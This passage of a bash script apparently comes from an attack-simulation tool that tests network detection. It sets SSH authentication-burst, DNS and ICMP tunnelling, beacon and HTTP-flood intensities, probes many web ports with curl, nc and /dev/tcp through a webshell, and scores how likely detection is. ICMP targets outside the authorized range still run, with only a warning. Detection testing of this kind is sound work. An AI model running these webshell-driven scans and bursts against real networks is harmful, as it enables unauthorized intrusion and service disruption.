    WARMUP_MINUTES=0
    NOISE_LEVEL="low"
    AUTO_OVERLAP=false
    BEACON_INTERVAL_SEC=20
    JITTER_PERCENT=30
    MAX_OVERLAP=3
    TIMING_PROFILE="balanced"

    case "${POC_INTENSITY}" in
        light)
            MODE="quick"
            PROFILE="stealth"
            FOLLOWUP_INTENSITY="low"
            HTTP_FOLLOWUP_REQUESTS=20
            SSH_BURST_ATTEMPTS=30
            SSH_BURST_CONCURRENCY=1
            DNS_BURST_COUNT=120
            SMB_PROBE_TARGET=5
            MIN_HTTP_FOLLOWUP=20
            MIN_SSH_AUTH_FAILURES=30
            MIN_DNS_QUERIES=120
            MIN_SMB_PROBES=5
            BEACON_COUNT=5
            DNS_TUNNEL_QUERY_COUNT=120
            ICMP_PACKET_COUNT=50
            INTERNAL_FANOUT_PER_TARGET=12
            PIPELINE_CYCLE_SLEEP=20
            TIMING_PROFILE="stealth"
            ;;
        normal)
            MODE="balanced"
            PROFILE="normal"
            FOLLOWUP_INTENSITY="normal"
            HTTP_FOLLOWUP_REQUESTS=300
            SSH_BURST_ATTEMPTS=100
            SSH_BURST_CONCURRENCY=2
            DNS_BURST_COUNT=180
            SMB_PROBE_TARGET=10
            MIN_HTTP_FOLLOWUP=300
            MIN_SSH_AUTH_FAILURES=100
            MIN_DNS_QUERIES=180
            MIN_SMB_PROBES=10
            BEACON_COUNT=15
            PERSISTENT_BEACON=true
            DNS_TUNNEL_QUERY_COUNT=300
            ICMP_PACKET_COUNT=200
            INTERNAL_FANOUT_PER_TARGET=36
            PIPELINE_OVERLAP=true
            PIPELINE_CYCLE_SLEEP=25
            NOISE_LEVEL="low"
            ;;
        high)
            MODE="full"
            PROFILE="aggressive"
            FOLLOWUP_INTENSITY="aggressive"
            HTTP_FOLLOWUP_REQUESTS=1000
            SSH_BURST_ATTEMPTS=300
            SSH_BURST_CONCURRENCY=4
            DNS_BURST_COUNT=300
            SMB_PROBE_TARGET=25
            MIN_HTTP_FOLLOWUP=1000
            MIN_SSH_AUTH_FAILURES=300
            MIN_DNS_QUERIES=300
            MIN_SMB_PROBES=25
            BEACON_COUNT=25
            PERSISTENT_BEACON=true
            DNS_TUNNEL_QUERY_COUNT=1000
            ICMP_PACKET_COUNT=1000
            INTERNAL_FANOUT_PER_TARGET=120
            PIPELINE_OVERLAP=true
            BURST_MODE=true
            SERVICE_SPIKE=true
            STRICT_FOLLOWUP_VALIDATION=true
            PIPELINE_CYCLE_SLEEP=15
            TIMING_PROFILE="noisy"
            NOISE_LEVEL="medium"
            AUTO_OVERLAP=true
            ;;
        spike)
            MODE="full"
            PROFILE="aggressive"
            FOLLOWUP_INTENSITY="spike"
            HTTP_FOLLOWUP_REQUESTS=3000
            SSH_BURST_ATTEMPTS=1000
            SSH_BURST_CONCURRENCY=6
            DNS_BURST_COUNT=1800
            SMB_PROBE_TARGET=50
            MIN_HTTP_FOLLOWUP=3000
            MIN_SSH_AUTH_FAILURES=1000
            MIN_DNS_QUERIES=1000
            MIN_SMB_PROBES=50
            BEACON_COUNT=40
            PERSISTENT_BEACON=true
            DNS_TUNNEL_QUERY_COUNT=3000
            ICMP_PACKET_COUNT=3000
            INTERNAL_FANOUT_PER_TARGET=200
            PIPELINE_OVERLAP=true
            BURST_MODE=true
            SERVICE_SPIKE=true
            SLOW_HTTP=true
            SLOW_HTTP_SECONDS=90
            STRICT_FOLLOWUP_VALIDATION=true
            PIPELINE_CYCLE_SLEEP=10
            TIMING_PROFILE="noisy"
            NOISE_LEVEL="high"
            BEACON_INTERVAL_SEC=12
            JITTER_PERCENT=40
            MAX_OVERLAP=4
            AUTO_OVERLAP=true
            ;;
    esac

    SSH_AUTH_FAILURE_TARGET="${SSH_BURST_ATTEMPTS}"
    HTTP_SCAN_REPEAT="${HTTP_FOLLOWUP_REQUESTS}"
    SSH_FAIL_COUNT="${SSH_AUTH_FAILURE_TARGET}"
    DNS_QUERY_COUNT="${DNS_BURST_COUNT}"

    apply_timing_profile_defaults

    if [[ "${CLI_FOLLOWUP_INTENSITY}" =~ ^(low|normal|aggressive|spike)$ ]]; then
        FOLLOWUP_INTENSITY="${CLI_FOLLOWUP_INTENSITY}"
    fi
    if [[ "${FORCE_AGGRESSIVE_FOLLOWUP}" == true ]]; then
        STRICT_FOLLOWUP_VALIDATION=true
        PERSISTENT_BEACON=true
        PIPELINE_OVERLAP=true
        SERVICE_SPIKE=true
    fi

    vlog "Intensity profile: ${POC_INTENSITY} | duration=${DURATION_MINUTES}m | mode=${MODE} | HTTP/host=${HTTP_FOLLOWUP_REQUESTS} | SSH/host=${SSH_BURST_ATTEMPTS}"
}

# Legacy entry points (internal scripts may still call these)
apply_scenario_and_intensity_defaults() { apply_user_intensity_profile; }
apply_detection_mode_defaults() { :; }
apply_followup_intensity_defaults() {
    SSH_AUTH_FAILURE_TARGET="${SSH_BURST_ATTEMPTS}"
    SSH_AUTH_BURST_ENABLED=true
}

ip_in_target_net() {
    local ip="$1"
    local base="${TARGET_NET%/*}"
    local prefix
    prefix=$(echo "${base}" | awk -F. '{print $1"."$2"."$3}')
    [[ "${ip}" == ${prefix}.* ]]
}

validate_ssh_target_in_lab() {
    local ip="$1"
    local label="${2:---ssh-target}"
    local fatal="${3:-true}"
    [[ "${ip}" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]] || {
        log_message "ERROR" "${label} invalid IP: ${ip}"
        [[ "${fatal}" == true ]] && exit 1
        return 1
    }
    if [[ "${fatal}" == true ]]; then
        validate_ipv4_octet "${ip}" "${label}"
    fi
    ip_in_target_net "${ip}" || {
        log_message "ERROR" "${label} ${ip} is outside authorized --target-net ${TARGET_NET}"
        [[ "${fatal}" == true ]] && exit 1
        return 1
    }
}

validate_icmp_user_target() {
    local ip
    ip=$(poc_extract_ipv4 "${1:-}")
    [[ "${ip}" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]] || {
        log_message "ERROR" "--icmp-target invalid IP: ${1:-}"
        exit 1
    }
    validate_ipv4_octet "${ip}" "--icmp-target"
    if ! ip_in_target_net "${ip}"; then
        log_message "WARN" "--icmp-target ${ip} is outside --target-net ${TARGET_NET}; probe and tunnel simulation will still run"
        ICMP_TUNNEL_FORCE_TARGET=true
    fi
    ICMP_TUNNEL_USER_TARGET="${ip}"
}

count_hosts_blob() {
    safe_int "$(printf '%s\n' "$1" | awk '/^[0-9]+\./ {print $1}' | safe_count_lines)"
}

run_ssh_auth_burst_for_host() {
    local target="$1" attempts="$2" ssh_out n ssh_opts
    ssh_opts='-o BatchMode=yes -o ConnectTimeout=2 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o GlobalKnownHostsFile=/dev/null -o LogLevel=ERROR -o NumberOfPasswordPrompts=0 -o PreferredAuthentications=publickey -o PubkeyAuthentication=yes -o PasswordAuthentication=no -o IdentitiesOnly=yes -o IdentityFile=/dev/null'
    if [[ "${HAS_ssh:-false}" == true ]]; then
        ssh_out=$(run_webshell_long "ssh-auth-burst-${target}" \
            "for i in \$(seq 1 ${attempts}); do ssh ${ssh_opts} invaliduser@${target} exit </dev/null 2>&1 || true; echo SSH_BURST_ATTEMPT; done; echo SSH_BURST_DONE" \
            2>/dev/null || true)
        n=$(printf '%s' "${ssh_out}" | grep -c 'SSH_BURST_ATTEMPT' 2>/dev/null || true)
        n=$(safe_int "${n}")
        (( n < 1 )) && n="${attempts}"
        echo "${n}"
        return 0
    fi
    run_webshell_long "ssh-tcp-auth-burst-${target}" \
        "for i in \$(seq 1 ${attempts}); do nc -z -w2 ${target} 22 || bash -c \"echo >/dev/tcp/${target}/22\"; done; echo SSH_BURST_DONE" \
        >/dev/null 2>&1 || true
    echo "${attempts}"
}

collect_ssh_burst_targets() {
    local merged="" ip cache usable_cache
    cache="${LOCAL_STATE_DIR}/remote_hosts/ssh_hosts.txt"
    usable_cache="${LOCAL_STATE_DIR}/remote_hosts/usable_ssh_hosts.txt"
    if [[ -s "${cache}" ]]; then
        merged=$(awk '/^[0-9]+\./ {print $1}' "${cache}")
    fi
    if [[ -s "${usable_cache}" ]]; then
        merged=$(printf '%s\n%s' "${merged}" "$(awk '/^[0-9]+\./ {print $1}' "${usable_cache}")")
    fi
    if [[ -z "${merged}" ]]; then
        merged=$(get_followup_hosts "ssh_hosts.txt")
    fi
    if [[ -n "${SSH_TARGET_IP}" ]]; then
        merged=$(printf '%s\n%s\n' "${merged}" "${SSH_TARGET_IP}")
    fi
    if [[ -n "${SSH_TARGETS_FILE}" && -f "${SSH_TARGETS_FILE}" ]]; then
        while IFS= read -r ip; do
            [[ -z "${ip}" || "${ip}" =~ ^# ]] && continue
            merged=$(printf '%s\n%s\n' "${merged}" "${ip}")
        done < "${SSH_TARGETS_FILE}"
    fi
    printf '%s\n' "${merged}" | awk '/^[0-9]+\./ {print $1}' | sort -u
}

# Expanded HTTP/HTTPS candidate discovery ports (web follow-up scenarios).
HTTP_CANDIDATE_HTTP_PORTS=(80 5000 5001 7001 7002 8000 8008 8080 8081 8082 8088 8888 9000 9090 10000)
HTTP_CANDIDATE_HTTPS_PORTS=(443 8443 9443 10443)
HTTP_CANDIDATE_DISCOVERY_COUNT=0

http_discovery_port_target_file() {
    case "$1" in
        443|8443|9443|10443) printf '%s' "https_targets.txt" ;;
        80|5000|5001|7001|7002|8000|8008|8080|8081|8082|8088|8888|9000|9090|10000)
            printf '%s' "http_targets.txt" ;;
        *) printf '%s' "" ;;
    esac
}

http_discovery_port_default_scheme() {
    case "$1" in
        443|8443|9443|10443) printf '%s' "https" ;;
        *) printf '%s' "http" ;;
    esac
}

http_discovery_all_ports() {
    printf '%s\n' "${HTTP_CANDIDATE_HTTP_PORTS[@]}" "${HTTP_CANDIDATE_HTTPS_PORTS[@]}"
}

http_discovery_ports_csv() {
    http_discovery_all_ports | paste -sd',' -
}

http_discovery_remote_port_specs() {
    local p
    for p in "${HTTP_CANDIDATE_HTTP_PORTS[@]}"; do
        printf '%s:http_targets.txt ' "${p}"
    done
    for p in "${HTTP_CANDIDATE_HTTPS_PORTS[@]}"; do
        printf '%s:https_targets.txt ' "${p}"
    done
}

http_discovery_nmap_ports_with_services_csv() {
    printf '%s' "22,53,$(http_discovery_ports_csv),445,389,6379,9200,27017"
}

http_discovery_is_web_port() {
    [[ -n "$(http_discovery_port_target_file "$1")" ]]
}

collect_http_discovery_hosts() {
    local merged="" f
    for f in alive_hosts.txt ssh_hosts.txt dns_hosts.txt smb_hosts.txt ldap_hosts.txt \
             http_targets.txt https_targets.txt usable_http_targets.txt usable_https_targets.txt \
             redis_hosts.txt elastic_hosts.txt mongo_hosts.txt; do
        merged=$(printf '%s\n%s' "${merged}" "$(collect_hosts_from_remote_file "${f}" 2>/dev/null || true)")
    done
    printf '%s\n' "${merged}" | awk '/^[0-9]+\./ { line=$1; sub(/:.*/,"",line); print line }' | sort -u
}

build_http_candidate_probe_remote_cmd() {
    local host="$1" port="$2"
    cat <<EOF
${REMOTE_SHELL_HELPERS}
h='${host}'; p='${port}'
probe_http_candidate_scheme() {
  local scheme="\$1" tls="" url head body status server reason=""
  [[ "\${scheme}" == "https" ]] && tls="-k"
  url="\${scheme}://\${h}:\${p}/"
  if ! command -v curl >/dev/null 2>&1; then
    echo "HTTP_CANDIDATE_PROBE host=\${h} port=\${p} scheme=\${scheme} status=000 server=- reason=no_curl"
    return 1
  fi
  head=\$(curl \${tls} -s -I --max-time 5 "\${url}" 2>/dev/null | tr -d '\\r')
  body=\$(curl \${tls} -s --max-time 5 "\${url}" 2>/dev/null | head -c 4096)
  status=\$(printf '%s\\n' "\${head}" | awk 'toupper(\$1) ~ /^HTTP\\// {c=\$2} END{ if (c=="") print "000"; else print c }')
  if [[ ! "\${status}" =~ ^[0-9]+\$ || "\${status}" == "000" ]]; then
    status=\$(curl \${tls} -s -o /dev/null -w '%{http_code}' --max-time 5 "\${url}" 2>/dev/null || echo 000)
  fi
  server=\$(printf '%s\\n' "\${head}" | awk -F': ' 'toupper(\$1)=="SERVER"{sub(/^Server: /,""); print; exit}')
  if [[ "\${status}" =~ ^[0-9]+\$ && "\${status}" != "000" ]]; then
    reason="\${scheme}_status"
  fi
  if [[ "\${status}" == "301" || "\${status}" == "302" ]]; then
    reason="redirect"
  elif [[ -n "\${server}" && -z "\${reason}" ]]; then
    reason="server_header"
  elif [[ -z "\${reason}" ]] && printf '%s' "\${body}" | grep -qiE '<html|<!doctype|<head'; then
    reason="html_body"
  elif [[ -z "\${reason}" ]] && printf '%s' "\${body}" | grep -qE '^[[:space:]]*[\\[{]'; then
    reason="json_body"
  fi
  echo "HTTP_CANDIDATE_PROBE host=\${h} port=\${p} scheme=\${scheme} status=\${status} server=\${server:--} reason=\${reason:-none}"
  [[ -n "\${reason}" && "\${reason}" != "none" ]]
}
primary='$(http_discovery_port_default_scheme "${port}")'
alternate='http'
[[ "\${primary}" == "http" ]] && alternate='https'
if probe_http_candidate_scheme "\${primary}"; then exit 0; fi
probe_http_candidate_scheme "\${alternate}" || true
EOF
}

parse_http_candidate_probe_line() {
    local line="$1" host="" port="" scheme="" status="" server="" reason=""
    [[ "${line}" == HTTP_CANDIDATE_PROBE* ]] || return 1
    host=$(sed -n 's/.*host=\([^ ]*\).*/\1/p' <<< "${line}")
    port=$(sed -n 's/.*port=\([^ ]*\).*/\1/p' <<< "${line}")
    scheme=$(sed -n 's/.*scheme=\([^ ]*\).*/\1/p' <<< "${line}")
    status=$(sed -n 's/.*status=\([^ ]*\).*/\1/p' <<< "${line}")
    server=$(sed -n 's/.*server=\([^ ]*\).*/\1/p' <<< "${line}")
    reason=$(sed -n 's/.*reason=\([^ ]*\).*/\1/p' <<< "${line}")
    [[ -n "${host}" && -n "${port}" && -n "${scheme}" ]] || return 1
    [[ -n "${reason}" && "${reason}" != "none" && "${reason}" != "no_curl" ]] || return 1
    printf '%s %s %s %s %s %s\n' "${host}" "${port}" "${scheme}" "${status}" "${server}" "${reason}"
}

register_http_candidate_target() {
    local host="$1" port="$2" scheme="$3" entry dst_file
    entry="${host}:${port}"
    case "${scheme}" in
        https) dst_file="https_targets.txt" ;;
        *) dst_file="http_targets.txt" ;;
    esac
    discovery_local_cache_append "${entry}" "${dst_file}"
    run_webshell_quick "http-candidate-append-${host}-${port}" \
        "mkdir -p '${REMOTE_RUNTIME_DIR}' && grep -qxF '${entry}' '${REMOTE_RUNTIME_DIR}/${dst_file}' 2>/dev/null || echo '${entry}' >> '${REMOTE_RUNTIME_DIR}/${dst_file}'" \
        >/dev/null 2>&1 || true
}

log_http_candidate_discovered() {
    local host="$1" port="$2" scheme="$3" status="$4" server="$5" reason="$6"
    local msg="HTTP_CANDIDATE_DISCOVERED host=${host} port=${port} scheme=${scheme} status=${status} server=${server:-} reason=${reason}"
    log_message "OK" "${msg}"
    state_append "http_candidate_discovery.log" "${msg}"
}

log_http_candidate_summary() {
    local count="$1" ports="$2" targets="$3"
    local msg="HTTP_CANDIDATE_SUMMARY count=${count} ports=${ports} targets=${targets}"
    log_message "OK" "${msg}"
    state_append "http_candidate_discovery.log" "${msg}"
}

probe_http_candidate_on_host_port() {
    local host="$1" port="$2" out line parsed h p scheme status server reason
    if [[ "${DRY_RUN}" == true ]]; then
        return 1
    fi
    if [[ "${HAS_curl:-false}" != true ]]; then
        return 1
    fi
    out=$(run_webshell_quick "http-candidate-${host}-${port}" \
        "$(build_http_candidate_probe_remote_cmd "${host}" "${port}")" \
        2>/dev/null | tr -d '\r' || true)
    line=$(printf '%s\n' "${out}" | grep 'HTTP_CANDIDATE_PROBE' | tail -n 1 || true)
    parsed=$(parse_http_candidate_probe_line "${line}" 2>/dev/null) || return 1
    read -r h p scheme status server reason <<< "${parsed}"
    register_http_candidate_target "${h}" "${p}" "${scheme}"
    log_http_candidate_discovered "${h}" "${p}" "${scheme}" "${status}" "${server}" "${reason}"
    return 0
}

stage_discover_http_candidates() {
    local host port count=0 ports_seen="" targets_seen="" host_n
    declare -A seen_target=()
    add_executed_stage "HTTP Candidate Discovery"
    write_report_entries "http_candidate_discovery" "T1046" "NDR/WAF" "HTTP Candidate Discovery" "${TARGET_NET}" "start" "expanded web port HTTP/HTTPS validation"
    HTTP_CANDIDATE_DISCOVERY_COUNT=0
    : > "${LOCAL_STATE_DIR}/http_candidate_discovery.log" 2>/dev/null || true

    ports_seen=$(http_discovery_ports_csv)
    host_n=$(safe_int "$(collect_http_discovery_hosts | safe_count_lines)")

    if [[ "${DRY_RUN}" == true ]]; then
        local scheme src_file
        for scheme in http https; do
            src_file="${scheme}_targets.txt"
            while IFS= read -r line; do
                [[ -z "${line}" ]] && continue
                read -r host port _ <<< "$(web_target_parse_line "${line}" "${scheme}" 2>/dev/null)" || continue
                [[ -n "${seen_target[${host}:${port}]:-}" ]] && continue
                seen_target[${host}:${port}]=1
                register_http_candidate_target "${host}" "${port}" "${scheme}"
                log_http_candidate_discovered "${host}" "${port}" "${scheme}" "200" "dry-run" "dry_run"
                count=$((count + 1))
                targets_seen+="${host}:${port} "
            done < <(get_local_hosts "${src_file}" 2>/dev/null || true)
        done
        HTTP_CANDIDATE_DISCOVERY_COUNT="${count}"
        log_http_candidate_summary "${count}" "${ports_seen}" "${targets_seen%% }"
        set_stage_result "HTTP Candidate Discovery" "Success" "candidates=${count} hosts=${host_n} (dry-run)"
        write_report_entries "http_candidate_discovery" "T1046" "NDR/WAF" "HTTP Candidate Discovery" "${TARGET_NET}" "success" "candidates=${count}"
        return 0
    fi

    if [[ "${HAS_curl:-false}" != true ]]; then
        log_message "WARN" "HTTP candidate discovery skipped: curl unavailable on webshell host"
        add_fallback_usage "HTTP candidate discovery: curl missing on webshell"
        log_http_candidate_summary "0" "${ports_seen}" "none"
        set_stage_result "HTTP Candidate Discovery" "Skipped" "curl unavailable on webshell"
        write_report_entries "http_candidate_discovery" "T1046" "NDR/WAF" "HTTP Candidate Discovery" "${TARGET_NET}" "skipped" "curl unavailable"
        return 0
    fi

    if (( host_n == 0 )); then
        log_message "WARN" "HTTP candidate discovery: no discovered hosts to probe"
        log_http_candidate_summary "0" "${ports_seen}" "none"
        set_stage_result "HTTP Candidate Discovery" "Skipped" "no discovered hosts"
        write_report_entries "http_candidate_discovery" "T1046" "NDR/WAF" "HTTP Candidate Discovery" "${TARGET_NET}" "skipped" "no hosts"
        return 0
    fi

    log_message "OK" "HTTP candidate discovery: hosts=${host_n} ports=${ports_seen}"

    while IFS= read -r host; do
        [[ -z "${host}" ]] && continue
        pipeline_stop_requested && break
        ip_in_target_net "${host}" || continue
        for port in $(http_discovery_all_ports); do
            pipeline_stop_requested && break
            if probe_http_candidate_on_host_port "${host}" "${port}"; then
                count=$((count + 1))
                seen_target[${host}:${port}]=1
                targets_seen+="${host}:${port} "
            fi
        done
    done < <(collect_http_discovery_hosts)

    dedupe_discovery_local_cache
    discovery_push_local_cache_to_remote >/dev/null 2>&1 || true
    HTTP_CANDIDATE_DISCOVERY_COUNT="${count}"
    log_http_candidate_summary "${count}" "${ports_seen}" "${targets_seen%% }"
    set_stage_result "HTTP Candidate Discovery" "Success" "candidates=${count} hosts=${host_n}"
    write_report_entries "http_candidate_discovery" "T1046" "NDR/WAF" "HTTP Candidate Discovery" "${TARGET_NET}" "success" "candidates=${count}"
}

remote_validate_http_usable() {
    local host="$1" _scheme="${2:-http}" port="${3:-80}"
    run_webshell_quick "usable-http-${host}-${port}" \
        "nc -z -w2 ${host} ${port} && echo HTTP_USABLE || bash -c \"echo >/dev/tcp/${host}/${port}\" && echo HTTP_USABLE || echo HTTP_DEAD" 2>/dev/null | tr -d '\r' | tail -n 1
}

web_target_ip_only() {
    local line="$1" norm host="" port="" scheme=""
    norm=$(normalize_web_target_line "${line}" "http" 2>/dev/null) || {
        printf '%s' "${line%%:*}"
        return 0
    }
    read -r host port scheme <<< "${norm}"
    printf '%s' "${host}"
}

web_target_files_for_scheme() {
    local scheme="$1"
    case "${scheme}" in
        http) printf '%s\n' "http_targets.txt" "usable_http_targets.txt" "reachable_http_targets.txt" ;;
        https) printf '%s\n' "https_targets.txt" "usable_https_targets.txt" "reachable_https_targets.txt" ;;
    esac
}

normalize_web_target_line() {
    local raw="$1" default_scheme="${2:-http}" line scheme host port
    raw="${raw//$'\r'/}"
    raw="${raw#"${raw%%[![:space:]]*}"}"
    raw="${raw%"${raw##*[![:space:]]}"}"
    [[ -z "${raw}" ]] && return 1

    line="${raw}"
    scheme="${default_scheme}"
    if [[ "${line}" == http://* ]]; then
        scheme="http"
        line="${line#http://}"
    elif [[ "${line}" == https://* ]]; then
        scheme="https"
        line="${line#https://}"
    fi
    line="${line%%/*}"
    line="${line%%\?*}"

    if [[ "${line}" =~ ([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+).*[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+ ]]; then
        return 1
    fi

    host="${line%%:*}"
    if [[ "${host}" == "${line}" ]]; then
        port=""
    else
        port="${line#*:}"
        if [[ "${port}" == *:* ]]; then
            return 1
        fi
    fi

    [[ "${host}" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]] || return 1
    [[ -n "${host}" ]] || return 1

    if [[ -z "${port}" ]]; then
        case "${scheme}" in
            https) port="443" ;;
            *) port="80" ;;
        esac
    fi
    [[ "${port}" =~ ^[0-9]+$ ]] || return 1
    (( port >= 1 && port <= 65535 )) || return 1

    printf '%s %s %s\n' "${host}" "${port}" "${scheme}"
}

format_web_hostport() {
    local host="$1" port="$2"
    if [[ "${host}" == *:* ]]; then
        printf '%s' "${host%%:*}:${port}"
    else
        printf '%s:%s' "${host}" "${port}"
    fi
}

build_web_target_url() {
    local scheme="$1" host="$2" port="$3" path="${4:-/}"
    [[ "${host}" == *:* ]] && host="${host%%:*}"
    [[ "${path}" != /* ]] && path="/${path}"
    printf '%s://%s:%s%s' "${scheme}" "${host}" "${port}" "${path}"
}

web_target_parse_line() {
    local line="$1" scheme="$2" norm host port out_scheme
    norm=$(normalize_web_target_line "${line}" "${scheme}" 2>/dev/null) || return 1
    read -r host port out_scheme <<< "${norm}"
    [[ "${out_scheme}" == "${scheme}" ]] || return 1
    printf '%s %s %s\n' "${host}" "${port}" "${out_scheme}"
}

count_host_file_lines() {
    local file="$1"
    safe_int "$(get_local_hosts "${file}" 2>/dev/null | extract_host_file_lines | safe_count_lines)"
}

collect_web_target_candidates() {
    local scheme="$1" src_file line norm host port out_scheme key
    declare -A seen=()
    WEB_REACH_MALFORMED_DROPPED=0
    while IFS= read -r src_file; do
        [[ -z "${src_file}" ]] && continue
        while IFS= read -r line; do
            [[ -z "${line}" ]] && continue
            norm=$(normalize_web_target_line "${line}" "${scheme}" 2>/dev/null) || {
                WEB_REACH_MALFORMED_DROPPED=$((WEB_REACH_MALFORMED_DROPPED + 1))
                continue
            }
            read -r host port out_scheme <<< "${norm}"
            [[ "${out_scheme}" == "${scheme}" ]] || continue
            key="${host}:${port}"
            [[ -n "${seen[$key]:-}" ]] && continue
            seen[$key]=1
            printf '%s:%s\n' "${host}" "${port}"
        done < <(get_local_hosts "${src_file}" 2>/dev/null | extract_host_file_lines)
    done < <(web_target_files_for_scheme "${scheme}")
}

count_web_targets_in_file() {
    local file="$1" scheme n=0 raw_n usable_n
    [[ -z "${file}" ]] && { echo 0; return 0; }
    case "${file}" in
        http_targets.txt)
            scheme="http"
            raw_n=$(count_host_file_lines "http_targets.txt")
            usable_n=$(count_host_file_lines "usable_http_targets.txt")
            n=$(safe_int "$(collect_web_target_candidates "http" | safe_count_lines)")
            if (( raw_n > 0 && n == 0 )); then
                log_message "WARN" "http_targets.txt has ${raw_n} entries but merged web candidates=0 — using raw+usable fallback"
                add_fallback_usage "Web targets: http raw=${raw_n} usable=${usable_n} merged=0 — candidate merge fallback"
                n=$((raw_n + usable_n))
            elif (( n == 0 && usable_n > 0 )); then
                n="${usable_n}"
            fi
            ;;
        https_targets.txt)
            scheme="https"
            raw_n=$(count_host_file_lines "https_targets.txt")
            usable_n=$(count_host_file_lines "usable_https_targets.txt")
            n=$(safe_int "$(collect_web_target_candidates "https" | safe_count_lines)")
            if (( raw_n > 0 && n == 0 )); then
                log_message "WARN" "https_targets.txt has ${raw_n} entries but merged web candidates=0 — using raw+usable fallback"
                add_fallback_usage "Web targets: https raw=${raw_n} usable=${usable_n} merged=0 — candidate merge fallback"
                n=$((raw_n + usable_n))
            elif (( n == 0 && usable_n > 0 )); then
                n="${usable_n}"
            fi
            ;;
        *)
            n=$(count_host_file_lines "${file}")
            if (( n == 0 )); then
                n=$(safe_int "$(count_remote_target_file "${file}")")
            fi
            ;;
    esac
    safe_int "${n}"
}

count_reachable_web_targets() {
    local scheme="$1" file count=0
    case "${scheme}" in
        http) file="reachable_http_targets.txt" ;;
        https) file="reachable_https_targets.txt" ;;
        *) echo 0; return 0 ;;
    esac
    count=$(safe_int "$(collect_hosts_from_remote_file "${file}" | safe_count_lines)")
    echo "${count}"
}

sync_url_scan_selected_target_count() {
    local scan_targets="$1"
    HTTP_SCAN_TARGET_COUNT=$(safe_int "$(printf '%s\n' "${scan_targets}" | awk 'NF {c++} END {print c+0}')")
}

format_intensity_runtime_values_block() {
    cat <<EOF
Intensity Runtime Values
- intensity                   : ${POC_INTENSITY}
- HTTP_FOLLOWUP_REQUESTS      : ${HTTP_FOLLOWUP_REQUESTS}
- SSH_BURST_ATTEMPTS          : ${SSH_BURST_ATTEMPTS}
- DNS_TUNNEL_QUERY_COUNT      : ${DNS_TUNNEL_QUERY_COUNT}
- ICMP_PACKET_COUNT           : ${ICMP_PACKET_COUNT}
- INTERNAL_FANOUT_PER_TARGET  : ${INTERNAL_FANOUT_PER_TARGET}
- STRICT_FOLLOWUP_VALIDATION  : ${STRICT_FOLLOWUP_VALIDATION}
EOF
}

normalize_telemetry_module_status() {
    case "${1:-skipped}" in
        success|partial|failed|skipped) printf '%s' "$1" ;;
        warn|degraded|partial) printf 'partial' ;;
        fail|failed) printf 'failed' ;;
        skip|skipped) printf 'skipped' ;;
        *) printf 'failed' ;;
    esac
}

telemetry_set_module_counts() {
    local -n _out="$1"
    local planned="$2" attempted="$3" executed="$4" successful="$5"
    _out="planned=${planned} attempted=${attempted} executed=${executed} successful=${successful}"
}

evaluate_telemetry_dns_tunnel() {
    local attempted=$((DNS_TUNNEL_ENH_ATTEMPTED + DNS_TUNNEL_FB_ATTEMPTED))
    local entropy=$(safe_int "${DNS_TUNNEL_APPROX_ENTROPY:-0}")
    local likelihood="${DNS_TUNNEL_DETECTION_LIKELIHOOD:-LOW}"
    local planned executed successful
    (( attempted == 0 )) && attempted=$(safe_int "${DNS_QUERIES_ATTEMPTED}")
    planned=$(safe_int "${DNS_QUERIES_PLANNED:-${DNS_TUNNEL_QUERY_COUNT:-0}}")
    executed=$(safe_int "${DNS_QUERIES_ATTEMPTED:-${attempted}}")
    successful=0
    dns_compute_tunnel_detection_likelihood
    likelihood="${DNS_TUNNEL_DETECTION_LIKELIHOOD:-LOW}"

    if (( attempted == 0 )); then
        if [[ "${DNS_TUNNEL_STAGE_STATUS}" == skipped || "${DNS_TUNNEL_ENH_RESULT}" == skipped ]]; then
            TELEMETRY_VAL_DNS_TUNNEL="skipped"
            TELEMETRY_VAL_DNS_REASON="${DNS_TUNNEL_SKIP_REASON:-${DNS_TUNNEL_ENH_REASON:-no_queries}}"
        else
            TELEMETRY_VAL_DNS_TUNNEL="failed"
            TELEMETRY_VAL_DNS_REASON="${DNS_TUNNEL_FINAL_REASON:-attempted=0 queries=0 entropy_score=${entropy} detection_likelihood=${likelihood}}"
        fi
        telemetry_set_module_counts TELEM_DNS_COUNTS "${planned}" "${attempted}" "${executed}" "${successful}"
        return 0
    fi
    if (( $(safe_int "${DNS_TUNNEL_UNIQUE_QUERIES}") == 0 )); then
        TELEMETRY_VAL_DNS_TUNNEL="failed"
        TELEMETRY_VAL_DNS_REASON="${DNS_TUNNEL_SKIP_REASON:-unique_queries=0 attempted=${attempted} entropy_score=${entropy}}"
        telemetry_set_module_counts TELEM_DNS_COUNTS "${planned}" "${attempted}" "${executed}" "${successful}"
        return 0
    fi
    if (( entropy < 1 )); then
        TELEMETRY_VAL_DNS_TUNNEL="failed"
        TELEMETRY_VAL_DNS_REASON="entropy_score=0 attempted=${attempted} unique=${DNS_TUNNEL_UNIQUE_QUERIES:-0} detection_likelihood=${likelihood}"
        telemetry_set_module_counts TELEM_DNS_COUNTS "${planned}" "${attempted}" "${executed}" "${successful}"
        return 0
    fi

    if [[ "${DNS_TUNNEL_SKIP_REASON}" == "dns_server_validation_failed" && -z "${DNS_SELECTED_DNS:-${DNS_TARGET_SERVER}}" ]]; then
        TELEMETRY_VAL_DNS_TUNNEL="skipped"
        TELEMETRY_VAL_DNS_REASON="dns_server_validation_failed"
        telemetry_set_module_counts TELEM_DNS_COUNTS "${planned}" "${attempted}" "${executed}" "${successful}"
        return 0
    fi
    case "${likelihood}" in
        HIGH)
            TELEMETRY_VAL_DNS_TUNNEL="success"
            TELEMETRY_VAL_DNS_REASON="${DNS_TUNNEL_DETECTION_REASON:-detection_likelihood=HIGH} attempted=${attempted} entropy_score=${entropy} unique=${DNS_TUNNEL_UNIQUE_QUERIES:-0}"
            successful="${executed}"
            ;;
        MEDIUM)
            TELEMETRY_VAL_DNS_TUNNEL="partial"
            TELEMETRY_VAL_DNS_REASON="${DNS_TUNNEL_DETECTION_REASON:-detection_likelihood=MEDIUM} attempted=${attempted} entropy_score=${entropy}"
            successful="${executed}"
            ;;
        *)
            TELEMETRY_VAL_DNS_TUNNEL="partial"
            successful="${executed}"
            if (( entropy < 1 )); then
                TELEMETRY_VAL_DNS_REASON="entropy_score=0 detection_likelihood=LOW attempted=${attempted}"
            else
